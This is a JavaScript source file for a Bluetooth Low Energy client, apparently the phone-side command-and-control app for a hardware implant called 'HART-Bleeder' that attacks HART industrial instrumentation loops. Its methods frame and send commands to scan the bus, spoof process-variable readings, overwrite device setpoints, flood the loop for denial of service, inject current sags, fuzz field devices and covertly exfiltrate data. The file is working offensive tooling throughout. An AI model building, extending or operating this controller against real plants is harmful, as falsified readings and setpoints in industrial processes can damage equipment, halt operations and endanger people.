/**
 * hart-bleeder — BLEManager.js
 * BLE GATT client for the HART-Bleeder companion C2 link.
 * Handles scanning, connection, authentication, command framing,
 * and notification subscriptions for status/log/frame characteristics.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

import { BleManager } from '@react-native-ble-plx/react-native-ble-plx';
import base64 from 'base64-js';

// UUIDs (must match App.js / firmware c2link.h)
const SVC_UUID    = 'a0000001-0000-1000-8000-00805f9b34fb';
const CHAR_CMD    = 'a0000002-0000-1000-8000-00805f9b34fb';
const CHAR_LOG    = 'a0000003-0000-1000-8000-00805f9b34fb';
const CHAR_STATUS = 'a0000004-0000-1000-8000-00805f9b34fb';
const CHAR_AUTH   = 'a0000005-0000-1000-8000-00805f9b34fb';
const CHAR_FRAME  = 'a0000006-0000-1000-8000-00805f9b34fb';

// C2 opcodes
export const OP = {
  STATUS: 0x01, SCAN: 0x02, READ_PV: 0x03, SPOOF: 0x04,
  SETPOINT: 0x05, DOS: 0x06, SAG: 0x07, CAPTURE: 0x08,
  FUZZ: 0x09, COVERT_EX: 0x0A, COVERT_RX: 0x0B,
  MODE: 0x0C, PASSIVE: 0x0D, AUTH: 0x10, LOG_NOTIFY: 0x20,
};

export default class BLEManager {
  constructor() {
    this.ble = new BleManager();
    this.device = null;
    this.onConnectionChange = null;
    this.onStatusUpdate = null;
    this.onFrame = null;
    this.onLog = null;
    this.onScanResult = null;
    this.seq = 0;
    this.psk = null;
  }

  async scanAndConnect() {
    return new Promise((resolve, reject) => {
      this.ble.startDeviceScan([SVC_UUID], null, (error, device) => {
        if (error) { reject(error); return; }
        if (device.name === 'HART-Bleeder' || device.localName === 'HART-Bleeder') {
          this.ble.stopDeviceScan();
          device.connect()
            .then((d) => d.discoverAllServicesAndCharacteristics())
            .then((d) => {
              this.device = d;
              this._subscribeNotifications();
              if (this.onConnectionChange) this.onConnectionChange(true);
              resolve(d);
            })
            .catch(reject);
        }
      });
    });
  }

  async disconnect() {
    if (this.device) {
      await this.device.cancelConnection();
      this.device = null;
      if (this.onConnectionChange) this.onConnectionChange(false);
    }
  }

  setPsk(psk) { this.psk = psk; }

  async authenticate(psk) {
    if (!this.device) throw new Error('not connected');
    this.psk = psk;
    // Generate 8-byte random challenge
    const challenge = new Uint8Array(8);
    for (let i = 0; i < 8; i++) challenge[i] = Math.floor(Math.random() * 256);
    await this._sendPacket(OP.AUTH, challenge);
    // Response arrives on AUTH characteristic notification
    return true;
  }

  async sendCommand(op, payload) {
    if (!this.device) throw new Error('not connected');
    const p = payload ? new Uint8Array(payload) : new Uint8Array(0);
    return this._sendPacket(op, p);
  }

  async scanBus() { return this.sendCommand(OP.SCAN); }
  async readPV(addr) { return this.sendCommand(OP.READ_PV, [addr]); }
  async spoofPV(ma) {
    const buf = new ArrayBuffer(4);
    new Float32Array(buf)[0] = ma;
    return this.sendCommand(OP.SPOOF, new Uint8Array(buf));
  }
  async writeSetpoint(addr, pct) {
    const buf = new ArrayBuffer(5);
    const dv = new DataView(buf);
    dv.setUint8(0, addr);
    dv.setFloat32(1, pct, true);
    return this.sendCommand(OP.SETPOINT, new Uint8Array(buf));
  }
  async loopDoS(ms) {
    const buf = new ArrayBuffer(4);
    new DataView(buf).setUint32(0, ms, true);
    return this.sendCommand(OP.DOS, new Uint8Array(buf));
  }
  async sagInject(ms, pct) {
    const buf = new ArrayBuffer(8);
    const dv = new DataView(buf);
    dv.setUint32(0, ms, true);
    dv.setFloat32(4, pct, true);
    return this.sendCommand(OP.SAG, new Uint8Array(buf));
  }
  async startCapture(ms) {
    const buf = new ArrayBuffer(4);
    new DataView(buf).setUint32(0, ms, true);
    return this.sendCommand(OP.CAPTURE, new Uint8Array(buf));
  }
  async fuzz(addr, count) {
    const buf = new ArrayBuffer(3);
    const dv = new DataView(buf);
    dv.setUint8(0, addr);
    dv.setUint16(1, count, true);
    return this.sendCommand(OP.FUZZ, new Uint8Array(buf));
  }
  async covertExfil(data) {
    const bytes = typeof data === 'string'
      ? new Uint8Array(data.split('').map((c) => c.charCodeAt(0)))
      : data;
    return this.sendCommand(OP.COVERT_EX, bytes);
  }
  async covertRecv() { return this.sendCommand(OP.COVERT_RX); }
  async setMode(mode) { return this.sendCommand(OP.MODE, [mode]); }
  async goPassive() { return this.sendCommand(OP.PASSIVE); }

  // ── Internal: packet framing ──────────────────────────────
  // Frame: [0xAA][0x55][seq][len][op][payload...][crc8]
  async _sendPacket(op, payload) {
    const len = payload.length + 1;
    const pkt = new Uint8Array(4 + len + 1);
    pkt[0] = 0xAA;
    pkt[1] = 0x55;
    pkt[2] = this.seq++;
    pkt[3] = len;
    pkt[4] = op;
    for (let i = 0; i < payload.length; i++) pkt[5 + i] = payload[i];
    // CRC8 XOR
    let crc = pkt[2] ^ pkt[3] ^ op;
    for (let i = 0; i < payload.length; i++) crc ^= payload[i];
    pkt[4 + len] = crc;

    const b64 = base64.fromByteArray(pkt);
    await this.device.writeCharacteristicWithResponseForService(
      SVC_UUID, CHAR_CMD, b64
    );
    return pkt;
  }

  // ── Notification subscriptions ────────────────────────────
  _subscribeNotifications() {
    // Status
    this.device.monitorCharacteristicForService(SVC_UUID, CHAR_STATUS,
      (err, char) => {
        if (err || !char) return;
        const bytes = base64.toByteArray(char.value);
        if (bytes.length >= 3 && this.onStatusUpdate) {
          this.onStatusUpdate(bytes[0], bytes[1], bytes[2],
            bytes.length >= 7 ? this._toFloat(bytes, 3) : 0);
        }
      });
    // Frame
    this.device.monitorCharacteristicForService(SVC_UUID, CHAR_FRAME,
      (err, char) => {
        if (err || !char) return;
        const bytes = base64.toByteArray(char.value);
        if (this.onFrame) this.onFrame(bytes);
      });
    // Log
    this.device.monitorCharacteristicForService(SVC_UUID, CHAR_LOG,
      (err, char) => {
        if (err || !char) return;
        const bytes = base64.toByteArray(char.value);
        const text = String.fromCharCode(...bytes);
        if (this.onLog) this.onLog(text);
      });
  }

  _toFloat(bytes, off) {
    const buf = new ArrayBuffer(4);
    const view = new DataView(buf);
    for (let i = 0; i < 4; i++) view.setUint8(i, bytes[off + i]);
    return view.getFloat32(0, true);
  }
}